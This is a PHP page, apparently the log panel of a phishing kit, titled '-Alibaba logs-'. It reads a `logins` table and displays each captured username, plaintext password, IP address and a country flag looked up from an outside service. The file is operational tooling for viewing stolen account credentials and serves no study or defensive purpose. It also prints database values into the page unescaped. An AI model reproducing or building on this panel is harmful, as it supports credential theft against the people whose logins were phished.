<?php

require_once("configuration/config.php");
require_once("includes/functions.php");

?>

<!doctype html>
<html lang="en">
	<script type="text/javascript"></script>
	
	<head>
		<title>-Alibaba logs-</title>
		<meta charset="utf-8">
	</head>
	
	<style>
		 
		table 				  { margin: auto; }
		td 					  { text-align: left; min-width: 150px; /*border: 1px solid;*/ padding-left: 10px; }
		table:nth-child(even) { background-color: hsla(210,44%,76%,.5); }
		body 				  { text-align: center; font-family: Arial; font-size: 11px;}
		img 				  {height: 12px; width: auto;}	
	
	</style>
	
	<body>
		<h3>-Alibaba logs-</h3>
		<table>
			<tr>
				<td>USERNAME</td>
				<td>PASSWORD</td>	
				<td>IP</td>
				<td>COUNTRY</td>	
			<tr>
		</table>
		<?php
			$query = mysql_query("SELECT `id`, `username`, `password`, `ip`, `country`, `city` FROM `logins` ORDER BY `id` DESC" );
			
			while( $row = mysql_fetch_assoc($query) ) {
				$theip = $row['ip'];
				echo "
				<table>
					<tr>
						<td>" . $row['username'] . "</td>
						<td>" . $row['password'] . "</td>
						<td>" . $row['ip'] . "</td>
						
						<td><img src='http://api.hostip.info/flag.php?ip=".$theip."'></td>
					</tr>
				</table>
				"; 
			}
		?>
		
	</body>

</html>

